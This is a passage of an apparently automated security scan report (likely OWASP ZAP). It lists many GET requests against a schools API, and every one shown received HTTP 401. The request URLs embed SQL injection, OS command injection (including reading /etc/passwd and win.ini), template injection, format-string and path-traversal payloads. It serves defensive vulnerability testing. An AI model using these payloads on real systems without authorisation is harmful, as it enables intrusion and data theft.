* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=phase%2527+AND+%25271%2527%253D%25271%2527+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=phase%2527+AND+%25271%2527%253D%25272%2527+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=phase%2527+and+0+in+%2528select+sleep%252815%2529+%2529+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=phase%2527+and+exists+%2528+select+%2522java.lang.Thread.sleep%2522%252815000%2529+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%253D+%2527SYSTEM_COLUMNS%2527+and+COLUMN_NAME+%253D+%2527TABLE_NAME%2527%2529+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=phase%2527+OR+%25271%2527%253D%25271%2527+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=phase%2527+UNION+ALL+select+NULL+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=phase%2527+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=phase%2527+where+0+in+%2528select+sleep%252815%2529+%2529+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=phase%2529%2529+%2522+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=phase%2529%2529+%2527+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=phase%2529%2529+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=phase%2529+%2522+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=phase%2529+%2527+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=phase%2529+UNION+ALL+select+NULL+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=phase%2529+WAITFOR+DELAY+%25270%253A0%253A15%2527+%2528
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=phase%2529+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=phase%253B
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=phase%253Bcat+%252Fetc%252Fpasswd%253B
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=phase%253Bget-help
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=phase%253Bget-help+%2523
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=phase%253Bsleep+15.0%253B
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=phase%253Bstart-sleep+-s+15.0
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=phase%253Bstart-sleep+-s+15.0+%2523
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=phase%257Ctimeout+%252FT+15.0
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=phase%257Ctype+%2525SYSTEMROOT%2525%255Cwin.ini
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=phase&class.module.classLoader.DefaultAssertionStatus=nonsense
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=phase+%252F+%2522java.lang.Thread.sleep%2522%252815000%2529+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=phase+%252F+%2528SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.1%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.2%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.3%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.4%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.5%2527%2529+from+dual%2529+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=phase+%252F+case+when+cast%2528pg_sleep%252815.0%2529+as+varchar%2529+%253E+%2527%2527+then+0+else+1+end+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=phase+%252F+sleep%252815%2529+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=phase+and+0+in+%2528select+sleep%252815%2529+%2529+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=phase+AND+1%253D1+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=phase+AND+1%253D2+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=phase+and+exists+%2528+select+%2522java.lang.Thread.sleep%2522%252815000%2529+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%253D+%2527SYSTEM_COLUMNS%2527+and+COLUMN_NAME+%253D+%2527TABLE_NAME%2527%2529+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=phase+and+exists+%2528SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.1%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.2%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.3%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.4%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.5%2527%2529+from+dual%2529+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=phase+or+0+in+%2528select+sleep%252815%2529+%2529+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=phase+OR+1%253D1+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=phase+UNION+ALL+select+NULL+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=phase+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=phase+where+0+in+%2528select+sleep%252815%2529+%2529+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=phase0W45pz4p
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=phase%3Fname=abc
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=ptumpj0ru0s1xa2m2qdwjiemryz6hxl47ava3rlzsfkho7lhd271nvteb
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=QJpYaqWxLRFdGjvOwpkvaUwgGYyAvlgwdlwJGZdDZYjQwblQUprGfijkxbXDRKHSYIFnhYwemAdwtpHGwOuQyaSOdFLtZJvGLZPvwuWpTNmXSHACMGFfAnqKLciaAEDihEYWQhQXpGATgtAccyyhbuXaJRyybVNfvBUCZvZmxZuFnNZMNFpiwoqsECSJrBTrIAYiCvHIdbdWOGrEVajuLrOpWdJSCHDOOXQmgDuJLOyFLFCbClvSrCpnJVUmSQwuEoYWmWaJkXKHvgWtsGGjXLKTLteILXOIknCnXerNCjhUGDkTsqhoXqTmgRYOCHOMDdQwLinEpwKjHnlvHeoVjIMGogApJKfZtTgUSBsFdjONDsjQrceAOYKFrSKIJibWgUQGLMixpIQPsCSBtKsqXRuQJWfyWJMDQTWwjgmfhkIYgIlnHEjPNPTvtZGSyXutNvQTNUFEHdfDiNAlQhMNpPpmOQXtjSmmrSvPkPqjLjYuNSTSDpjamKkZjVehmVZltcqeHirByLilwswUTODBFEjQQnJdVCFRkBmlTkNNwoUDZgeEXsFRLasKXRktKdPwdNifnjyWiKYPcaLKyGgqLlTFlbGRwnHEVRKtJqIpcrmbVbplsgBdYElrMpRgHYZjEVwPwavwKCwgeIAYgmEdDkkaGSpUsnrqTiXbMmsvebFemdosnBBmIpCeauNaDfmKtRNyFDbfEDuVQgFaIJAfZfCHZQlJsmQTtyVhgjnAMqxLUvLkpWvxdXmdsdeiYdwPDFNqqUPtusniFVBWrMnPZLjoPFKlSBDjIqNIllBkMTVcIwCwJCcOGWdgCTYGCEYgkOlxerbfJtlXFINBFnodrUxAEWRtvbOcJuoSbTYUWjmKfUZPOnXiCVRbdUpTvPdfSLVmipoPbxySIjoagmBeBELqaNhmrPLdxEACsRiyxMOOvProvZGhBWienCQbUwXmWcmWjcXUDAGDwunPthwmiMLLpIZxMJEwnKPedsbvCbdSGBTwXMEJuccpHIUbyEjXIOfLftAYmhiMECTugFsplGXVUChVMQNDBxxGcYccXXYHvXtGsFSyyDXKwygxvREaoWYxMOCKUqAQxuwlZJIhILSLKfwGlCYylTADGoZHuhpUNEMkulsfjNWjgfypdbyktUEdFoQCrdkKLfZcCCtLmjEVHOCDysSBuOKLThJlcgvZKEyIJLGgUqjNqrtYCOSKIMFsEMVFfVLRBYVLQjGZGjCwRJZNUtrDiybabvmjGXTYcGTakjHIvYQtlvtcsYDIJAZaVdtqkZenxOMTMRFoZfSHasXgJKSVAZDhqbjxFUmfWAIQNBnrQnnqDdTnUOoguaPfQEnDqFWRVeqmGwGBnEOUOCPxvIbspOyNulcYEopSrhAgjKTEZbJVpaGSloreFLfbEcfAonaxikCFweYZjODZGispaaHROCWCdFCJVIOvVfBQwYDASuTMuYlGsffHOeZXOxbnlxUxLwttGLOckaIGjINvQcvoBIKQhHFfWXaSNZNwJeUwKjGVDkBVVUkXksrboZbtnFwAQnKsKLiWKSltJPiCJStTMJrEOmOBnKlhUirFipiksPSEyKMnFovBNufrrEiAZCkyjJDJlWSwkcDarjysJBcFVpKUidTAKCyjAaPZLRNmYeexVPZKVCBbYsfGgEZKKMsCACskFOjMvgWVwKGADcsMSbNWIVLmbdsrtwxTxSCUeelFgicqFAgqmkvlUqgKpcNIvJvWxwbHKpfPUsDoKnfIwLpkDyTqghvrQmiqcPdIkpRjDUrJGERNYLeQmExKoFhZpyKZBjlrTromFfBtUwBcchbygUtDcDBIZOxadylYyLZCgXVNTFGjDqJxRrhBaJsTTAoFJbvtggxHXRFbKgNQfssCghNwPkAJLQMgVEkNIHyVreWXXSWmkysMpVxDVwDJobohGpXISYXdZCpnJcausKMeymHWbEeXxcFBoaWuRmtEWLamoUICpGBEkyvsrqOvgsPHEPXpYbXdeTQBaTGXGTJJqCFnWZlqfVISoehbyvkKeDsnbVmqTDAHSjkyXdGJVfyYLfLOTmAkQKsEYRRikIDCJWYjMRJYRxbCEFMK
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=response.write%252812%252C162*273%252C265%2529
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=schools
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=Set-cookie%253A+Tamper%253D08e6eae0-ec62-49e3-95ac-97e753f36ba6
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=thishouldnotexistandhopefullyitwillnot
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=type+%2525SYSTEMROOT%2525%255Cwin.ini
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=URL%253D%2527http%253A%252F%252F980414377652208366.owasp.org%2527
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=WEB-INF%252Fweb.xml
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=WEB-INF%255Cweb.xml
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=www.google.com
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=www.google.com%252F
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=www.google.com%252Fsearch%253Fq%253DZAP
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=www.google.com%253A80%252F
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=www.google.com%253A80%252Fsearch%253Fq%253DZAP
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=ZAP
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=ZAP%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%250A
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=ZAP+%25251%2521s%25252%2521s%25253%2521s%25254%2521s%25255%2521s%25256%2521s%25257%2521s%25258%2521s%25259%2521s%252510%2521s%252511%2521s%252512%2521s%252513%2521s%252514%2521s%252515%2521s%252516%2521s%252517%2521s%252518%2521s%252519%2521s%252520%2521s%252521%2521n%252522%2521n%252523%2521n%252524%2521n%252525%2521n%252526%2521n%252527%2521n%252528%2521n%252529%2521n%252530%2521n%252531%2521n%252532%2521n%252533%2521n%252534%2521n%252535%2521n%252536%2521n%252537%2521n%252538%2521n%252539%2521n%252540%2521n%250A
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=zApPX54sS
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=zj%2523%257B9077*7369%257Dzj
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=zj%2523set%2528%2524x%253D8659*2380%2529%2524%257Bx%257Dzj
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=zj%2524%257B6148*1363%257Dzj
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=zj%253C%2525%253D4318*5454%2525%253Ezj
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=zj%253Cp+th%253Atext%253D%2522%2524%257B2308*8257%257D%2522%253E%253C%252Fp%253Ezj
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=zj%257B%25232117*3082%257Dzj
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=zj%257B%25408817*3126%257Dzj
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=zj%257B%2540math+key%253D%25226980%2522+method%253D%2522multiply%2522+operand%253D%25224768%2522%252F%257Dzj
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=zj%257B%257B%253D8934*9691%257D%257Dzj
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=zj%257B%257B20980%257Cadd%253A50260%257D%257Dzj
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=zj%257B%257B3924*4613%257D%257Dzj
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=zj%257B%257Bprint+%25226144%2522+%25227286%2522%257D%257Dzj
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=zj%257B5991*5144%257Dzj
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10&phase=zj+6666*2816+zj
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10+%252F+%2522java.lang.Thread.sleep%2522%252815000%2529+&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10+%252F+%2528SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.1%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.2%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.3%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.4%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.5%2527%2529+from+dual%2529+&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10+%252F+case+when+cast%2528pg_sleep%252815.0%2529+as+varchar%2529+%253E+%2527%2527+then+0+else+1+end+&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10+%252F+sleep%252815%2529+&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10+and+0+in+%2528select+sleep%252815%2529+%2529+--+&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber&laCode=10+AND+1%253D1+--+&phase=phase
